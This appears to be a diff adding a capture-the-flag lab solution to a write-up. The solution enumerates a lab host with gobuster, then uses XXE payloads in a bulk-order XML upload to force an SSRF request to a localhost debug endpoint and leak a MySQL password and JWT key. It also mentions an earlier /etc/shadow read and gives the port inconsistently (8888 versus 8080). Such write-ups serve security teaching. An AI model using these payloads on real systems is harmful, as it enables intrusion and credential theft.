@@ -347,3 +347,69 @@ Modified the XML file to include an External Entity declaration that reads `/etc
 - The content of /etc/shadow was displayed in the response where the product name appears
 
 <img width="1728" height="970" alt="Screenshot 2025-10-07 at 22 03 35" src="https://github.com/user-attachments/assets/944469ad-499f-42ac-b594-c424bfa1ef6c" />
+
+# 5 SCHOGGI: Server-Side Request Forgery (SSRF) with XXE Solution
+
+## Attack Steps Description
+
+### Step 1: Preparation - Directory Enumeration
+- Used gobuster to discover hidden endpoints on the web server
+- Command executed:
+```bash
+gobuster dir -e -u https://5c5ca280-0462-4b42-a274-c2debc6ddec7.i.vuln.land -w /usr/share/wordlists/dirb/common.txt
+```
+- Discovered `/debug` endpoint that exists but returns 403 Forbidden
+- Accessing `/debug` in browser revealed it can only be accessed from localhost
+
+### Step 2: Understanding SSRF Attack Vector
+
+- The `/debug` endpoint is blocked externally but accessible from the server itself
+- Can leverage the XXE vulnerability in Bulk Order functionality to make the server request the endpoint
+- This is a Server-Side Request Forgery (SSRF) attack - the server makes the request on our behalf
+
+### Step 3: Initial SSRF Attempt
+Created XXE payload to access the debug endpoint via localhost:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE query [ <!ENTITY attack SYSTEM "localhost/debug"> ]>
+<order>
+    <product>
+        <name>&attack;</name>
+        <quantity>25</quantity>
+    </product>
+</order>
+```
+
+
+Result: Error indicating invalid XML or connection issue
+
+### Step 4: Port Discovery
+
+- The debug endpoint might be on a different internal port
+- Guessed common web server port 8080
+- According to hints, port 8888 also works
+
+### Step 5: Successful SSRF Attack
+Modified XXE payload to target the correct port:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE query [ <!ENTITY attack SYSTEM "http://localhost:8888/debug"> ]>
+<order>
+    <product>
+        <name>&attack;</name>
+        <quantity>25</quantity>
+    </product>
+</order>
+```
+
+### Step 6: Extracting Sensitive Information
+
+- Uploaded the crafted XML through Bulk Order functionality
+- The server processed the XXE payload and made an HTTP request to localhost:8080/debug
+- The response from the debug endpoint was included in the bulk order confirmation
+- Successfully retrieved MySQL password and JWT signing key
+
+<img width="1728" height="966" alt="Screenshot 2025-10-07 at 22 13 04" src="https://github.com/user-attachments/assets/6015b373-1420-48e0-806b-558acb25a03e" />
+
